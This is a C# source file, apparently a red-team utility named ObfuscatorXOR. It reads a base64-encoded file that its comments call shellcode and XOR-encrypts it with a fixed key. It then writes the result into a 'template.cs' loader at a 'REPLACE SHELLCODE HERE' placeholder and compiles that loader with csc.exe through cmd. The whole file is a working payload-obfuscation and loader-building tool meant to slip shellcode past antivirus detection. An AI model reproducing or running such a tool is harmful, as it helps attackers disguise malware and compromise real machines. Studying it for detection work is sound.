using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace ObfuscatorXOR
{
    class Program
    {
        private static bool IsBase64String(string base64)
        {
            base64 = base64.Trim();
            return (base64.Length % 4 == 0) && Regex.IsMatch(base64, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        private static Random random = new Random();
        public static string RandomKey(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static byte[] xorEncDec(byte[] input, string theKeystring)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }

        static void Main(string[] args)
        {

            // get file path

            string base64String = "";
            string filePath = "";
            if (args.Count() > 0) // if arg exists
            {
                filePath = args[0];

                if (!File.Exists(filePath)) //if file exists
                {
                    Console.WriteLine("[+] Missing input file");
                    Environment.Exit(0);
                }

            }

            //check if its base64 encoded
            base64String = File.ReadAllText(filePath);

            if (!IsBase64String(base64String))
            {
                Console.WriteLine("[!] Make sure that it is a base64 string");
            }else
            {
                //string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(base64String)); //convert b64 to bytes shellcode

                //var xorEncString = xorEncDec(Encoding.UTF8.GetBytes(decoded), xorKey);

                var xorKey = "lovely".ToString();

                var xorEncString = xorEncDec(Convert.FromBase64String(base64String), xorKey); //encrypt

                var xorEncStringB64 = Convert.ToBase64String(xorEncString);

                Console.WriteLine($"XOR encrypted text: {xorEncStringB64}");

                //decrypt it back

                //var decrypted = Convert.ToBase64String(xorEncDec((Convert.FromBase64String(xorEncStringB64)), xorKey));

                //Console.WriteLine($"XOR decrypted text: {decrypted}");

                // Write the file 
                var fullPath = Path.Combine(Directory.GetCurrentDirectory(), "payload.b64");

                using (StreamWriter writer = new StreamWriter(fullPath))
                {
                    writer.WriteLine(xorEncStringB64);
                }

                // Open template file
                var templateFile = Path.Combine(Directory.GetCurrentDirectory(), "template.cs");
                // read all content
                string templateFileContent = File.ReadAllText(templateFile);
                // replace "string xoredB64" line
                templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorEncStringB64);
                // write all back into the file
                File.WriteAllText("template.cs", templateFileContent);

                //compile the code
                string strCmd = "/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe "+ templateFile;
                System.Diagnostics.Process.Start("CMD.exe", strCmd);
            }
        }


    }

}
